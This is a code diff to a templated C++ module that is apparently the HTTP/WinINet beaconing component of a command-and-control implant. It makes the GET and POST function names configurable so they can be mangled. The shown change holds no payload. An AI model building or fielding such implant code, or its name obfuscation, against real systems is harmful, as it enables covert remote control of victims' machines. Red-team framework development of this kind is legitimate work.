@@ -17,22 +17,22 @@ Required Keys:
 
  - http_post_client_output_terminator: Terminator for the POST client output
  - http_post_client_output_terminator_value: Value of terminator
+
+ - http_get_function_name: Name of the GET function
+ - http_post_function_name: Name of the POST function
+    > both used to mangle the func names a bit, and not have overlapping func names
 #]
 
-#include <vector>
-#include <iostream>
-#include "../protocols/http_wininet/http.h"
-#include "../data/transforms/transforms.h"
-#include "../data/msgpack/msgpack.h"
-#include "../protocols/json/json.h"
 
 [% from 'transform.j2' import render_transform -%]
 [% from 'transform_reverse.j2' import render_reverse_transform -%]
 [% from 'http_add_headers_or_parameters.j2' import render_add_headers_or_parameters -%]
 
+//specific to the wininet http impl
+#include "../protocols/http_wininet/http.h"
 using namespace std::string_literals;
 
-nlohmann::json get(std::string implant_uuid) {
+nlohmann::json [["http_get_function_name"]](std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::string http_response_buffer;
 
@@ -150,7 +150,7 @@ nlohmann::json get(std::string implant_uuid) {
     return nullptr;
 }
 
-int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
+int [["http_post_function_name"]](std::string implant_uuid, std::string output_data, std::string task_uuid) {
     // Prep Payload
     std::vector<uint8_t> task_response_msgpack;
     create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);
